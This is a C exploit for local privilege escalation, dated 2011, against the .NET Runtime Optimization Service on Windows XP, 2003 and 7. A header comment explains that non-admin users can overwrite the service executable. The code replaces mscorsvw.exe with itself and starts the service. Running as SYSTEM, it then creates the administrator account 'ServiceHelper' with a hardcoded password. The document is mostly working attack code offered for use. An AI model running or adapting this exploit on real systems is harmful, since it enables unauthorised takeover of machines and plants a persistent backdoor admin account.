/*
# Exploit Title: .NET Runtime Optimization Service Privilege Escalation
# Date: 03-07-2011
# Author: XenoMuta <xenomuta@tuxfamily.org>
# Version: v2.0.50727
# Tested on: Windows XP (sp3), 2003 R2, 7
# CVE : n/a

    _  __                 __  ___      __
   | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
   |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
  /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ /
 /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/

 xenomuta [at] tuxfamily.org
 xenomuta [at] gmail.com
 http://xenomuta.tuxfamily.org/ - Methylxantina 256mg

 This one's a no-brainer, plain simple:

 This service's EXE file can be overwritten by any non-admin domain user
 and local power users ( wich are the default permissions set ).
 This exploit compiles to a service that uses the original service's id.

 Tested on Windows 2003, WinXP (sp3) and Win7 
 ( my guess is that it runs on any win box running this service ).

 greetz to fr1t0l4y, L.Garay, siriguillo and the c0ff33 br34k t34m!!
 
 bless y'all!

*/
#include <stdio.h>
#include <windows.h>

SERVICE_STATUS          ServiceStatus;
SERVICE_STATUS_HANDLE   hStatus;

#define PWN_EXE     "c:\\WINDOWS\\Microsoft.NET\\Framework\\v2.0.50727\\mscorsvw.exe"
#define PWN_SHORT   "mscorsvw.exe"
#define PWN_NAME    ".NET Runtime Optimization Service v2.0.50727_X86"
#define PWN_ID      "clr_optimization_v2.0.50727_32"

void  ServiceMain(int argc, char** argv) {
    if (InitService()) {
       ServiceStatus.dwCurrentState = SERVICE_STOPPED;
       ServiceStatus.dwWin32ExitCode = -1;
       SetServiceStatus(hStatus, &ServiceStatus);
       return;
    }
   ServiceStatus.dwCurrentState = SERVICE_RUNNING;
   SetServiceStatus (hStatus, &ServiceStatus);
}

void ControlHandler(DWORD request);
int InitService();

int main(int argc, char **argv) {
    char acUserName[100];
    DWORD nUserName = sizeof(acUserName);
    GetUserName(acUserName, &nUserName);

    if (strcmp((char *)&acUserName, "SYSTEM")) {
        char *str = (char *)malloc(2048);
        memset(str, 0, 2048);
        snprintf(str, 2048, "%s.bak", PWN_EXE);
        if (rename(PWN_EXE, str) != 0) {
           fprintf(stderr, " :(  sorry, can't write to file.\n");
           exit(1);
        }
        CopyFile(argv[0], PWN_EXE, !0);
        snprintf(str, 2048, "net start \"%s\" 2> NUL > NUL",PWN_NAME);
        printf("\n >:D should have created a \n\n Username:\tServiceHelper\n Password:\tILov3Coff33!\n\n");
        system(str);
    }

    SERVICE_TABLE_ENTRY ServiceTable[2];

    ServiceTable[0].lpServiceName = PWN_ID;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(ServiceTable);

    return 0;
}

int InitService() {
    system("cmd /c net user ServiceHelper ILov3Coff33! /add & net localgroup Administrators ServiceHelper /add");
}
